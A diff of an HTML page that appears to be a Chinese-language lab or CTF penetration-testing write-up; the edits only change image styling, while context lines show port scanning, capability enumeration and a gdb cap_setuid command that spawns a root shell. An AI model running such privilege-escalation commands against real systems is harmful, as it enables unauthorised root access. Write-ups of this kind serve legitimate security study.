@@ -183,9 +183,9 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 12.23 s
 <p>扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP)。</p>
 <h2><strong>2. Web 服务探测与任意文件读取</strong></h2>
 <p>对 80 端口感兴趣，访问 Web 页面。访问有点慢，发现它在加载<code class="notranslate">192.168.5.32:8080</code>的东西，我们先给他禁了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52"><img src="https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52"><img src="https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52" alt="image" style="max-width: 100%;"></a></p>
 <p>上去在people看到有两个用户，<code class="notranslate">anonymous</code>和<code class="notranslate">an0ma1</code></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a"><img src="https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a"><img src="https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a" alt="image" style="max-width: 100%;"></a></p>
 <div>
 <br>
 </div>
@@ -477,7 +477,7 @@ penetration@asd:/opt$ /sbin/getcap -r / <span class="pl-k">2&gt;</span>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
 </pre></div>
 <p>有个<code class="notranslate">/usr/bin/gdb cap_setuid=ep</code>可以<code class="notranslate">Capabilities</code>可以利用</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d"><img src="https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d"><img src="https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d" alt="image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">penetration@asd:/opt$ /usr/bin/gdb -nx -ex <span class="pl-s"><span class="pl-pds">'</span>python import os; os.setuid(0)<span class="pl-pds">'</span></span> -ex <span class="pl-s"><span class="pl-pds">'</span>!sh<span class="pl-pds">'</span></span> -ex quit
 GNU gdb (Ubuntu 13.1-2ubuntu2.1) 13.1
 Copyright (C) 2023 Free Software Foundation, Inc.
